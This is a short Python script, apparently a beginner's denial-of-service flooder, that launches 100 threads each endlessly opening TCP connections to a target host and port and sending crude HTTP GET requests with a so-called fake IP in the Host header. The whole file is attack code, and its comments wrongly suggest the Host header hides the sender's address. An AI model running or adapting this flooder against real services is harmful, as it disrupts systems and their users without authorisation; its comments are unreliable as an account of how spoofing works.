import socket
import threading

target = '127.0.0.1' #localhost
fake_ip = '192.168.20.32'#fake ip address that the target sees
port = 5021 #open port that were attacking 

def attack():
    while True:
        a = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #INET is ip address or server address and Sock stream is port 
        a.connect((target, port)) #defined here
        a.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        a.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
        a.close()

for i in range(100): # parallelized for loop to run as many instances at the same time
    th = threading.Thread(target=attack)
    th.start()
    
